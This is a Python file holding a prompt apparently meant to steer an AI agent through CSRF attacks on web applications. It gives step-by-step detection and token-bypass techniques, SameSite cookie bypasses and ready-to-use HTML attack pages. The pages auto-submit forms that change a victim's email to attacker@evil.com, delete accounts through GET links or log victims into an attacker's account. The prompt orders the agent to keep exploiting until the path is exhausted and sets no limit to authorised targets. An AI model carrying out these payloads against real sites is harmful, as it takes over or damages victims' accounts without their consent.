"""
CSRF (Cross-Site Request Forgery) Attack Skill Prompt.
"""
CSRF_SKILL_PROMPT = """
## ATTACK SKILL: CSRF (CROSS-SITE REQUEST FORGERY)

**CRITICAL: This attack skill has been CLASSIFIED as CSRF.**
**Follow the CSRF workflow below. Do NOT switch to other attack methods**
**until you have exhausted the full detection and exploitation path.**

---

### MANDATORY CSRF WORKFLOW

#### STEP 1: DETECTION — Check CSRF Protection

For every state-changing endpoint (POST, PUT, DELETE, PATCH):
1. Check if there's a CSRF token in the request (header `X-CSRF-Token`, form field `_csrf`, `authenticity_token`).
2. Remove the CSRF token entirely and re-send — if it still works, CSRF is viable.
3. Send with an empty CSRF token value — some implementations check presence but not validity.
4. Change one character in the token — weak validation might accept it.

#### STEP 2: TOKEN BYPASS TECHNIQUES

**Token not tied to session:**
Generate your own CSRF token from your own session, use it in the victim's request context.

**Token leaked in GET parameter:**
If `?csrf_token=xxx` appears in URL, it may be logged in referer headers.

**Token validation skipped for certain methods:**
Change `POST` → `GET` — some frameworks only validate POST.
Add `_method=GET` parameter to bypass method-based validation.

**CORS misconfig + CSRF chain:**
If CORS allows your origin, read the CSRF token via XHR first, then submit.

#### STEP 3: EXPLOITATION — Craft Attack Page

**Form auto-submit (classic):**
```html
<html>
<body>
  <form id="csrf" action="https://TARGET/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com">
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

**JSON CSRF (when Content-Type validation is weak):**
```html
<html>
<body>
  <form id="csrf" action="https://TARGET/api/users/update" method="POST"
        enctype="text/plain">
    <input type="hidden" name='{"email":"attacker@evil.com","ignore":"' value='"}'>
  </form>
  <script>document.getElementById('csrf').submit();</script>
</body>
</html>
```

#### STEP 4: SAME-SITE COOKIE BYPASS

Check cookie attributes:
- `SameSite=None` → always sent cross-origin (needs `Secure`)
- `SameSite=Lax` → sent on top-level GET navigations only
- `SameSite=Strict` → never sent cross-origin

**Lax bypass via GET:** If the endpoint accepts GET for state changes:
```html
<a href="https://TARGET/delete-account">Click me</a>
```
Or use `window.open()` in JavaScript.

**Lax bypass via pre-flight-less POST:** Some browsers have a 2-minute window after setting a cookie where Lax behaves like None.

#### STEP 5: LOGIN CSRF

Force victim to log into YOUR account:
```html
<form action="https://TARGET/login" method="POST">
  <input name="username" value="attacker">
  <input name="password" value="attacker_pass">
</form>
```
→ Victim's actions (searches, purchases) are attributed to your account — you can see them.

#### ANTI-PATTERNS (DO NOT DO):
- Do NOT assume CSRF is dead because of SameSite cookies — there are bypasses.
- Do NOT only test POST — some endpoints accept GET for state changes.
- Do NOT ignore login CSRF — it enables session fixation chains.
"""
